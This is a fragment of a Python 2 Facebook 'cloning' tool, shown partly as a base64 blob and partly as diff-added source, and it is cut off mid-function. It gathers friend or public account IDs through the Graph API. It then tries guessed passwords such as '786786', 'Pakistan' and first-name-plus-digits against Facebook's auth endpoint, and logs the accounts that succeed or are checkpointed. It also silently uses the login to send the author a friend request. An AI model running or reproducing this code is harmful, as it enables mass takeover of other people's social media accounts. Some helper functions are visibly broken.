yICsgJy1ceDFiWzE7OTFt4pynXHgxYlsxOzk3bS0nICsgcGFzczINCgkJCQkJCQljZWsgPSBvcGVuKCJvdXQvY2hlY2twb2ludC50eHQiLCAiYSIpDQoJCQkJCQkJY2VrLndyaXRlKHVzZXIrInwiK3Bhc3MyKyJcbiIpDQoJCQkJCQkJY2VrLmNsb3NlKCkNCgkJCQkJCQljZWtwb2ludC5hcHBlbmQodXNlcitwYXNzMikNCgkJCQkJCWVsc2U6DQoJCQkJCQkJcGFzczMgPSBiWydmaXJzdF9uYW1lJ10gKyAnMTIzJw0KCQkJCQkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKHVzZXIpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHBhc3MzKSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikNCgkJCQkJCQlxID0ganNvbi5sb2FkKGRhdGEpDQoJCQkJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4gcToNCgkJCQkJCQkJcHJpbnQgJ1x4MWJbMTs5Mm1TdWNjZXNzZnVsXHgxYlsxOzk3bS1ceDFiWzE7OTJt4pynXHgxYlsxOzk3bS0nICsgdXNlciArICctXHgxYlsxOzkybeKcp1x4MWJbMTs5N20tJyArIHBhc3MzDQoJCQkJCQkJCW9rcy5hcHBlbmQodXNlcitwYXNzMykNCgkJCQkJCQllbHNlOg0KCQkJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsiZXJyb3JfbXNnIl06DQoJCQkJCQkJCQlwcmludCAnXHgxYlsxOzkxbUNoZWNrcG9pbnRceDFiWzE7OTdtLVx4MWJbMTs5MW3inKdceDFiWzE7OTdtLScgKyB1c2VyICsgJy1ceDFiWzE7OTFt4pynXHgxYlsxOzk3bS0nICsgcGFzczMNCgkJCQkJCQkJCWNlayA9IG9wZW4oIm91dC9jaGVja3BvaW50LnR4dCIsICJhIikNCgkJCQkJCQkJCWNlay53cml0ZSh1c2VyKyJ8IitwYXNzMysiXG4iKQ0KCQkJCQkJCQkJY2VrLmNsb3NlKCkNCgkJCQkJCQkJCWNla3BvaW50LmFwcGVuZCh1c2VyK3Bhc3MzKQ0KCQkJCQkJCQllbHNlOg0KCQkJCQkJCQkJcGFzczQgPSAnUGFraXN0YW4nDQoJCQkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzNCkrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpDQoJCQkJCQkJCQlxID0ganNvbi5sb2FkKGRhdGEpDQoJCQkJCQkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOg0KCQkJCQkJCQkJCXByaW50ICdceDFiWzE7OTJtU3VjY2Vzc2Z1bFx4MWJbMTs5N20tXHgxYlsxOzkybeKcp1x4MWJbMTs5N20tJyArIHVzZXIgKyAnLVx4MWJbMTs5Mm3inKdceDFiWzE7OTdtLScgKyBwYXNzNA0KCQkJCQkJCQkJCW9rcy5hcHBlbmQodXNlcitwYXNzNCkNCgkJCQkJCQkJCWVsc2U6DQoJCQkJCQkJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbImVycm9yX21zZyJdOg0KCQkJCQkJCQkJCQlwcmludCAnXHgxYlsxOzkxbUNoZWNrcG9pbnRceDFiWzE7OTdtLVx4MWJbMTs5MW3inKdceDFiWzE7OTdtLScgKyB1c2VyICsgJy1ceDFiWzE7OTFt4pynXHgxYlsxOzk3bS0nICsgcGFzczQNCgkJCQkJCQkJCQkJY2VrID0gb3Blbigib3V0L2NoZWNrcG9pbnQudHh0IiwgImEiKQ0KCQkJCQkJCQkJCQljZWsud3JpdGUodXNlcisifCIrcGFzczQrIlxuIikNCgkJCQkJCQkJCQkJY2VrLmNsb3NlKCkNCgkJCQkJCQkJCQkJY2VrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczQpDQoJCQkJCQkJCQkJZWxzZToNCgkJCQkJCQkJCQkJcGFzczUgPSBiWydmaXJzdF9uYW1lJ10gKyAnMTInDQoJCQkJCQkJCQkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKHVzZXIpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHBhc3M1KSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikNCgkJCQkJCQkJCQkJcSA9IGpzb24ubG9hZChkYXRhKQ0KCQkJCQkJCQkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOg0KCQkJCQkJCQkJCQkJcHJpbnQgJ1x4MWJbMTs5Mm1TdWNjZXNzZnVsXHgxYlsxOzk3bS1ceDFiWzE7OTJt4pynXHgxYlsxOzk3bS0nICsgdXNlciArICctXHgxYlsxOzkybeKcp1x4MWJbMTs5N20tJyArIHBhc3M1DQoJCQkJCQkJCQkJCQlva3MuYXBwZW5kKHVzZXIrcGFzczUpDQoJCQkJCQkJCQkJCWVsc2U6DQoJCQkJCQkJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsiZXJyb3JfbXNnIl06DQoJCQkJCQkJCQkJCQkJcHJpbnQgJ1x4MWJbMTs5MW1DaGVja3BvaW50XHgxYlsxOzk3bS1ceDFiWzE7OTFt4pynXHgxYlsxOzk3bS0nICsgdXNlciArICctXHgxYlsxOzkxbeKcp1x4MWJbMTs5N20tJyArIHBhc3M1DQoJCQkJCQkJCQkJCQkJY2VrID0gb3Blbigib3V0L2NoZWNrcG9pbnQudHh0IiwgImEiKQ0KCQkJCQkJCQkJCQkJCWNlay53cml0ZSh1c2VyKyJ8IitwYXNzNSsiXG4iKQ0KCQkJCQkJCQkJCQkJCWNlay5jbG9zZSgpDQoJCQkJCQkJCQkJCQkJY2VrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczUpDQoJCQkJCQkJCQkJCQllbHNlOg0KCQkJCQkJCQkJCQkJCXBhc3M2ID0gYlsnZmlyc3RfbmFtZSddICsgJzEyMzQnDQoJCQkJCQkJCQkJCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcikrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocGFzczYpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQ0KCQkJCQkJCQkJCQkJCXEgPSBqc29uLmxvYWQoZGF0YSkNCgkJCQkJCQkJCQkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOg0KCQkJCQkJCQkJCQkJCQlwcmludCAnXHgxYlsxOzkybVN1Y2Nlc3NmdWxceDFiWzE7OTdtLVx4MWJbMTs5Mm3inKdceDFiWzE7OTdtLScgKyB1c2VyICsgJy1ceDFiWzE7OTJt4pynXHgxYlsxOzk3bS0nICsgcGFzczYNCgkJCQkJCQkJCQkJCQkJb2tzLmFwcGVuZCh1c2VyK3Bhc3M2KQ0KCQkJCQkJCQkJCQkJCWVsc2U6DQoJCQkJCQkJCQkJCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWyJlcnJvcl9tc2ciXToNCgkJCQkJCQkJCQkJCQkJCXByaW50ICdceDFiWzE7OTFtQ2hlY2twb2ludFx4MWJbMTs5N20tXHgxYlsxOzkxbeKcp1x4MWJbMTs5N20tJyArIHVzZXIgKyAnLVx4MWJbMTs5MW3inKdceDFiWzE7OTdtLScgKyBwYXNzNg0KCQkJCQkJCQkJCQkJCQkJY2VrID0gb3Blbigib3V0L2NoZWNrcG9pbnQudHh0IiwgImEiKQ0KCQkJCQkJCQkJCQkJCQkJY2VrLndyaXRlKHVzZXIrInwiK3Bhc3M2KyJcbiIpDQoJCQkJCQkJCQkJCQkJCQljZWsuY2xvc2UoKQ0KCQkJCQkJCQkJCQkJCQkJY2VrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczYpDQoJCQkJCQkJCQkJCQkJCWVsc2U6DQoJCQkJCQkJCQkJCQkJCQlhID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8nK3VzZXIrJy8/YWNjZXNzX3Rva2VuPScrdG9rZXQpDQoJCQkJCQkJCQkJCQkJCQliID0ganNvbi5sb2FkcyhhLnRleHQpDQoJCQkJCQkJCQkJCQkJCQlwYXNzNyA9IGJbJ2ZpcnN0X25hbWUnXSArICc3ODYnDQoJCQkJCQkJCQkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzNykrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpDQoJCQkJCQkJCQkJCQkJCQlxID0ganNvbi5sb2FkKGRhdGEpDQoJCQkJCQkJCQkJCQkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOg0KCQkJCQkJCQkJCQkJCQkJCXByaW50ICdceDFiWzE7OTJtU3VjY2Vzc2Z1bFx4MWJbMTs5N20tXHgxYlsxOzkybeKcp1x4MWJbMTs5N20tJyArIHVzZXIgKyAnLVx4MWJbMTs5Mm3inKdceDFiWzE7OTdtLScgKyBwYXNzNw0KCQkJCQkJCQkJCQkJCQkJCW9rcy5hcHBlbmQodXNlcitwYXNzNykNCgkJCQkJCQkJCQkJCQkJCWVsc2U6DQoJCQkJCQkJCQkJCQkJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbImVycm9yX21zZyJdOg0KCQkJCQkJCQkJCQkJCQkJCQlwcmludCAnXHgxYlsxOzkxbUNoZWNrcG9pbnRceDFiWzE7OTdtLVx4MWJbMTs5MW3inKdceDFiWzE7OTdtLScgKyB1c2VyICsgJy1ceDFiWzE7OTFt4pynXHgxYlsxOzk3bS0nICsgcGFzczcNCgkJCQkJCQkJCQkJCQkJCQkJY2VrID0gb3Blbigib3V0L2NoZWNrcG9pbnQudHh0IiwgImEiKQ0KCQkJCQkJCQkJCQkJCQkJCQljZWsud3JpdGUodXNlcisifCIrcGFzczcrIlxuIikNCgkJCQkJCQkJCQkJCQkJCQkJY2VrLmNsb3NlKCkNCgkJCQkJCQkJCQkJCQkJCQkJY2VrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczcpDQoJCQkJCQkJCQkJCQkJCQkJCQ0KCQkJCQkJCQkJCQkJCQkJDQoJCWV4Y2VwdDoNCgkJCXBhc3MNCgkJDQoJcCA9IFRocmVhZFBvb2woMzApDQoJcC5tYXAobWFpbiwgaWQpDQoJcHJpbnQgIlwwMzNbMTs5N23Cqy0tLS0tLS0tLS0tLS0tLS0tLS0tXDAzM1sxOzkybeKcp1wwMzNbMTs5N20tLS0tLS0tLS0tLS0tLS0tLS0tLcK7Ig0KCXByaW50ICIgIFwwMzNbMTs5MW3Cqy0tLS0tLS0tLURldmVsb3BlZCBCeSBPbWktLS0tLS0tLS0tLS3CuyINCglwcmludCAnXDAzM1sxOzkybVByb2Nlc3MgSGFzIEJlZW4gQ29tcGxldGVkXDAzM1sxOzkybS4uLi4nDQoJcHJpbnQiXDAzM1sxOzkybVRvdGFsIE9LL1x4MWJbMTs5M21DUCBcMDMzWzE7OTFtOiBcMDMzWzE7OTJtIitzdHIobGVuKG9rcykpKyJcMDMzWzE7OTdtL1wwMzNbMTs5M20iK3N0cihsZW4oY2VrcG9pbnQpKQ0KCXByaW50KCJcMDMzWzE7OTJtQ1AgRmlsZSBIYXMgQmVlbiBTYXZlZFwwMzNbMTs5Mm06XDAzM1sxOzk3bW91dC9jaGVja3BvaW50LnR4dCIpDQoJcmF3X2lucHV0KCJcblwwMzNbMTs5Nm1bXDAzM1sxOzk3bUJhY2tcMDMzWzE7OTZtXSIpDQoJbWVudSgpDQoNCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6DQoJbG9naW4oKQ0K==')))
+#!/usr/bin/python2
+#coding=utf-8
+
+
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+
+
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+
+
+def keluar():
+	print "\x1b[1;91mExit"
+	os.sys.exit()
+
+
+def acak(b):
+    w = 'ahtdzjc'
+    d = ''
+    for i in x:
+        d += '!'+w[random.randint(0,len(w)-1)]+i
+    return cetak(d)
+
+
+def cetak(b):
+    w = 'ahtdzjc'
+    for i in w:
+        j = w.index(i)
+        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
+    x += '\033[0m'
+    x = x.replace('!0','\033[0m')
+    sys.stdout.write(x+'\n')
+
+
+def jalan(z):
+	for e in z + '\n':
+		sys.stdout.write(e)
+		sys.stdout.flush()
+		time.sleep(00000.1)
+
+
+##### LOGO #####
+logo = """
+  \033[1;97m,ad8888ba,   88b           d88  88  
+ \033[1;97md8"'    `"8b  888b         d888  88  
+\033[1;92md8'        `8b 88`8b       d8'88  88  
+\033[1;92m88          88 88 `8b     d8' 88  88  
+\033[1;92m88          88 88  `8b   d8'  88  88  
+\033[1;92mY8,        ,8P 88   `8b d8'   88  88  
+ \033[1;92mY8a.    .a8P  88    `888'    88  88  
+  \033[1;92m`"Y8888Y"'   88     `8'     88  88
+
+\033[1;97m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;92m๑۩۩๑\033[1;97m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
+\033[1;97mAuthor©\033[1;97m: \033[1;92mOmi Chaudhary
+\033[1;97mInstagram\033[1;97m: \033[1;92mhttps://www.Instagram.com/Omi6t
+\033[1;97mFacebook\033[1;97m: \033[1;92mhttps://www.facebook.com/Omi6t
+\033[1;97mWhatsapp\033[1;97m: \033[1;92m+923117675174
+\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"""
+
+def tik():
+	titik = ['.   ','..  ','... ']
+	for o in titik:
+		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+
+
+back = 0
+berhasil = []
+cekpoint = []
+oks = []
+id = []
+listgrup = []
+vulnot = "\033[31mNot Vuln"
+vuln = "\033[32mVuln"
+
+os.system("clear")
+print  """
+\033[1;97m__        _______ _     \033[1;92m____ ___  __  __ _____ 
+\033[1;97m\ \      / | ____| |   \033[1;92m/ ___/ _ \|  \/  | ____|
+ \033[1;97m\ \ /\ / /|  _| | |  \033[1;92m| |  | | | | |\/| |  _|  
+  \033[1;97m\ V  V / | |___| |__\033[1;92m| |__| |_| | |  | | |___ 
+   \033[1;97m\_/\_/  |_____|_____\033[1;92m\____\___/|_|  |_|_____|
+\033[1;97m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;92m๑۩۩๑\033[1;97m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
+\033[1;97mAuthor©\033[1;97m: \033[1;92mOmi Chaudhary
+\033[1;97mInstagram\033[1;97m: \033[1;92mhttps://www.Instagram.com/Omi6t
+\033[1;97mFacebook\033[1;97m: \033[1;92mhttps://www.facebook.com/Omi6t
+\033[1;97mWhatsapp\033[1;97m: \033[1;92m+923117675174
+\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"""
+
+CorrectUsername = "Omi6t"
+CorrectPassword = "Omi"
+
+loop = 'true'
+while (loop == 'true'):
+    username = raw_input("\033[1;96m🔐 \x1b[1;93mTool Username \x1b[1;93m»» \x1b[1;96m")
+    if (username == CorrectUsername):
+    	password = raw_input("\033[1;96m🔐 \x1b[1;93mTool Password \x1b[1;93m»» \x1b[1;96m")
+        if (password == CorrectPassword):
+            print "Logged in successfully as " + username
+            loop = 'false'
+        else:
+            print "\033[1;91mWrong Password"
+            os.system('xdg-open https://www.Facebook.com/Omi6t')
+    else:
+        print "\033[1;91mWrong Username"
+        os.system('xdg-open https://www.Facebook.com/Omi6t')
+
+def login():
+	os.system('clear')
+	try:
+		toket = open('login.txt','r')
+		menu() 
+	except (KeyError,IOError):
+		os.system('clear')
+		print logo
+		jalan(' \033[1;91mWarning: \033[1;97mDo Not Use Your Personal Account' )
+		jalan('          \033[1;97mUse a Fresh Account To Login' )
+		print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
+		print('	   \033[1;95m【\x1b[1;95mLOGIN WITH FACEBOOK\x1b[1;95m】' )
+		print('	' )
+		id = raw_input('\033[1;96m[+] \x1b[1;93mID/Email\x1b[1;93m: \x1b[1;96m')
+		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword\x1b[1;93m: \x1b[1;96m')
+		tik()
+		try:
+			br.open('https://m.facebook.com')
+		except mechanize.URLError:
+			print"\n\x1b[1;91mThere is no internet connection"
+			keluar()
+		br._factory.is_html = True
+		br.select_form(nr=0)
+		br.form['email'] = id
+		br.form['pass'] = pwd
+		br.submit()
+		url = br.geturl()
+		if 'save-device' in url:
+			try:
+				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
+				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
+				x=hashlib.new("md5")
+				x.update(sig)
+				a=x.hexdigest()
+				data.update({'sig':a})
+				url = "https://api.facebook.com/restserver.php"
+				r=requests.get(url,params=data)
+				z=json.loads(r.text)
+				unikers = open("login.txt", 'w')
+				unikers.write(z['access_token'])
+				unikers.close()
+				print '\n\x1b[1;92mLogin Successful...'
+				os.system('xdg-open https://www.Facebook.com/Omi6t')
+				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
+				menu()
+			except requests.exceptions.ConnectionError:
+				print"\n\x1b[1;91mThere is no internet connection"
+				keluar()
+		if 'checkpoint' in url:
+			print("\n\x1b[1;91mYour Account is on Checkpoint")
+			os.system('rm -rf login.txt')
+			time.sleep(1)
+			keluar()
+		else:
+			print("\n\x1b[1;91mPassword/Email is wrong")
+			os.system('rm -rf login.txt')
+			time.sleep(1)
+			login()
+
+
+def menu():
+	os.system('clear')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		os.system('clear')
+		print"\x1b[1;91mToken invalid"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	try:
+		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
+		a = json.loads(otw.text)
+		nama = a['name']
+		id = a['id']
+	except KeyError:
+		os.system('clear')
+		print"\033[1;91mYour Account is on Checkpoint"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	except requests.exceptions.ConnectionError:
+		print"\x1b[1;91mThere is no internet connection"
+		keluar()
+	os.system("clear")
+	print logo
+	print "  \033[1;97m«---------\033[1;95mLogged in User Info\033[1;97m---------»"
+	print "	   \033[1;93m Name\033[1;93m:\033[1;97m"+nama+"\033[1;97m               "
+	print "	   \033[1;93m ID\033[1;93m:\033[1;97m"+id+"\x1b[1;97m              "
+	print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
+	print "\033[1;97m--\033[1;92m> \033[1;92m1.\x1b[1;92mStart Cloning..."
+	print "\033[1;97m--\033[1;91m> \033[1;91m0.\033[1;91mExit            "
+	pilih()
+
+
+def pilih():
+	unikers = raw_input("\n\033[1;97mChoose an Option>>> \033[1;97m")
+	if unikers =="":
+		print "\x1b[1;91mFill in correctly"
+		pilih()
+	elif unikers =="1":
+		super()
+	elif unikers =="0":
+		jalan('Token Removed')
+		os.system('rm -rf login.txt')
+		keluar()
+	else:
+		print "\x1b[1;91mFill in correctly"
+		pilih()
+
+
+def super():
+	global toket
+	os.system('clear')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\x1b[1;91mToken invalid"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	os.system('clear')
+	print logo
+	print "\033[1;97m--\033[1;92m> \033[1;92m1.\x1b[1;92mClone From Friend List..."
+	print "\033[1;97m--\033[1;92m> \033[1;92m2.\x1b[1;92mClone From Public ID..."
+	print "\033[1;97m--\033[1;91m> \033[1;91m0.\033[1;91mBack"
+	pilih_super()
+
+def pilih_super():
+	peak = raw_input("\n\033[1;97mChoose an Option>>> \033[1;97m")
+	if peak =="":
+		print "\x1b[1;91mFill in correctly"
+		pilih_super()
+	elif peak =="1":
+		os.system('clear')
+		print logo
+		print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
+		jalan('\033[1;93mGetting IDs \033[1;97m...')
+		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
+		z = json.loads(r.text)
+		for s in z['data']:
+			id.append(s['id'])
+	elif peak =="2":
+		os.system('clear')
+		print logo
+		idt = raw_input("\033[1;96m[+] \033[1;93mEnter ID\033[1;93m: \033[1;97m")
+		print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
+		try:
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			op = json.loads(jok.text)
+			print"\033[1;93mName\033[1;93m:\033[1;97m "+op["name"]
+		except KeyError:
+			print"\x1b[1;91mID Not Found!"
+			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
+			super()
+		print"\033[1;93mGetting IDs\033[1;93m..."
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
+		z = json.loads(r.text)
+		for i in z['data']:
+			id.append(i['id'])
+	elif peak =="0":
+		menu()
+	else:
+		print "\x1b[1;91mFill in correctly"
+		pilih_super()
+	
+	print "\033[1;93mTotal IDs\033[1;93m: \033[1;97m"+str(len(id))
+	jalan('\033[1;93mPlease Wait\033[1;93m...')
+	titik = ['.   ','..  ','... ']
+	for o in titik:
+		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
+	print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
+	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
+	print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
+	
+			
+	def main(arg):
+		global cekpoint,oks
+		user = arg
+		try:
+			os.mkdir('out')
+		except OSError:
+			pass
+		try:
+			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+			b = json.loads(a.text)
+			pass1 = ('786786')
+			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+			q = json.load(data)
+			if 'access_token' in q:
+				print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;92m✧\x1b[1;97m-' + pass1
+				oks.append(user+pass1)
+			else:
+				if 'www.facebook.com' in q["error_msg"]:
+					print '\x1b[1;91mCheckpoint\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + pass1
+					cek = open("out/checkpoint.txt", "a")
+					cek.write(user+"|"+pass1+"\n")
+					cek.close()
+					cekpoint.append(user+pass1)
+				else:
+					pass2 = b['first_name']+'12345'
+					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+					q = json.load(data)
+					if 'access_token' in q:
+						print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;92m✧\x1b[1;97m-' + pass2
+						oks.append(user+pass2)
+					else:
+						if 'www.facebook.com' in q["error_msg"]:
+							print '\x1b[1;91mCheckpoint\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + pass2
+							cek = open("out/checkpoint.txt", "a")
+							cek.write(user+"|"+pass2+"\n")
+							cek.close()
+							cekpoint.append(user+pass2)
+						else:
+							pass3 = b['first_name'] + '123'
+							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+							q = json.load(data)
+							if 'access_token' in q:
+								print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;92m✧\x1b[1;97m-' + pass3
+								oks.append(user+pass3)
+							else:
+								if 'www.facebook.com' in q["error_msg"]:
+									print '\x1b[1;91mCheckpoint\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + pass3
+									cek = open("out/checkpoint.txt", "a")
+									cek.write(user+"|"+pass3+"\n")
+									cek.close()
+									cekpoint.append(user+pass3)
+								else:
+									pass4 = 'Pakistan'
+									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+									q = json.load(data)
+									if 'access_token' in q:
+										print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;92m✧\x1b[1;97m-' + pass4
+										oks.append(user+pass4)
+									else:
+										if 'www.facebook.com' in q["error_msg"]:
+											print '\x1b[1;91mCheckpoint\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + pass4
+											cek = open("out/checkpoint.txt", "a")
+											cek.write(user+"|"+pass4+"\n")
+											cek.close()
+											cekpoint.append(user+pass4)
+										else:
+											pass5 = b['first_name'] + '12'
+											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+											q = json.load(data)
+											if 'access_token' in q:
